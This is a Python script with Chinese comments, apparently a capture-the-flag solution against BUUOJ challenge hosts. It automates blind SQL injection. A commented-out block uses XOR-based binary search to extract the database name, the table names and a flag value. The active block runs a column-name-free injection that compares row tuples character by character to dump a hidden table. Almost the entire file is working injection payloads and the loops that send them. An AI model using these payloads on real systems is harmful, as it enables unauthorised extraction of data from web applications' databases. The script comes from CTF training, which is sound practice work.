# # # 二分法sql盲注GET传参
# import requests
# import time
#
# host = 'http://8e76b4a0-0c4a-4828-8ef6-7a6c3bfb012a.node3.buuoj.cn/index.php'
#
# ans=''
# for i in range(1,1000):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while low < high:
#         # 拿库
#
#         data1 = {'id' : "1^(ascii(substr((select(database())),%d,1))<%d)^1"%(i,mid)}
#         # 拿表
#         data2 = {"id":'1^1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),%d,1))<%d)' %(i,mid)}
#         # 拿字段
#         data3 = {"id":'1^1^((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format()}
#         # 拿数据
#         data4 = {"id":'1^(ascii(substr((select(group_concat(flag))from(f1ag_1s_h3r3_hhhhh)),%d,1))<%d)^1'%(i,mid)}
#         res = requests.post(host,data=data4)
#         if "Nu1L" in res.text: # 1^1^1
#             high = mid
#         else:
#             low = mid+1
#         mid=(low+high)//2
#         # 延时防止429
#         time.sleep(1)
#     if mid <= 32 or mid >= 127:
#         break
#     ans += chr(mid-1)
#     print(ans)



# 无列名注入
import requests
import time

url = 'http://22cd941e-afc7-431a-b06a-1612399adc5f.node3.buuoj.cn/'
def add(flag):
    res = ''
    res += flag
    return res
flag = ''
for i in range(1,200):
    for char in range(32, 127):
        hexchar = add(flag + chr(char))
        payload = '2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)
        #print(payload)
        data = {'id':payload}
        r = requests.post(url=url, data=data)
        text = r.text
        time.sleep(0.1)
        if 'Nu1L' in r.text:
            flag += chr(char-1)
            print(flag)
            break
